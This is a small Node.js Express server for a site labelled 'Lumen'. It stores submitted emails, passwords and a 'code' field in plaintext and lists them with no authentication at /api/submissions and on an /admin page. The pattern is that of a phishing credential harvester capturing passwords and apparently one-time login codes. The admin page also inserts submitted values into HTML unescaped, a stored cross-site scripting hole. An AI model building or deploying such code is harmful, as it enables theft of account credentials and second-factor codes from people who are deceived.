const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const DATA_FILE = path.join(__dirname, 'submissions.json');

app.use(bodyParser.json());
app.use(express.static('public'));

function readData() {
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
}
function writeData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

app.post('/api/submit', (req, res) => {
  const { email, password, code } = req.body;
  const data = readData();
  data.push({ time: new Date().toLocaleString(), email, password, code });
  writeData(data);
  res.json({ ok: true });
});

app.get('/api/submissions', (req, res) => {
  res.json(readData());
});

app.get('/admin', (req, res) => {
  const data = readData().slice().reverse();
  const rows = data.map(s => '<tr><td>' + s.time + '</td><td>' + s.email + '</td><td>' + s.password + '</td><td>' + s.code + '</td></tr>').join('');
  res.send('<html><head><title>Submissions</title><style>body{font-family:sans-serif;padding:24px;background:#f6f5f1;}table{border-collapse:collapse;width:100%;background:#fff;}th,td{border:1px solid #ddd;padding:8px;text-align:left;font-size:14px;}th{background:#2f4731;color:#fff;}</style></head><body><h1>Lumen - Submissions</h1><table><tr><th>Time</th><th>Email</th><th>Password</th><th>Code</th></tr>' + rows + '</table></body></html>');
});

app.listen(process.env.PORT || 3000, () => console.log('Server running'));
